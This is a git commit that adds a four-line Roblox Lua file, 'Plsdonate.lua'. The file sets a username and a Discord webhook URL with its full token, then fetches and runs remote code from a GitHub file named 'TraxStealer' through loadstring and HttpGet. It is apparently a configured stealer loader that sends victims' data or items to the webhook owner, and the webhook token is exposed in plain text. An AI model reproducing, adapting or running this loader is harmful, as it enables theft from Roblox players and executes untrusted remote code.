533b11af65243b87d7446906a997c8f7e6df60ba
kn-h0b <nebisatyusifova@gmail.com>
2025-04-16 21:58:24 +0400

    Create Plsdonate.lua

---
+++ Plsdonate.lua
@@ -0,0 +1,4 @@
+Username = "im_kiddd8"
+Webhook = "https://discord.com/api/webhooks/1358460462542622790/SNoI8OR9caSnSsPeYzWWytBi30cqxuitOzysYaYNREIUQIaQfUUMXTwlICOV9P6PHUhU"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PlsDonate/refs/heads/main/TraxStealer"))()
